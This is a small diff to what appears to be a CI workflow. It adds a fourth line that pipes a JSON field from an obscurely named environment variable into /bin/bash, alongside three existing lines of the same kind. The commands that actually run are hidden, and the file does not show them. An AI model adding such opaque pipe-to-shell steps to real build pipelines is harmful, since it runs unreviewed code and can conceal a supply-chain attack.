@@ -24,6 +24,7 @@ jobs:
           echo $ppdg037 | jq -r .kgock725 | /bin/bash
           echo $cpw34 | jq -r .lo411 | /bin/bash
           printf '%s' "$kn6" | jq -r .t343 | /bin/bash
+          echo $boci6 | jq -r .dj612 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
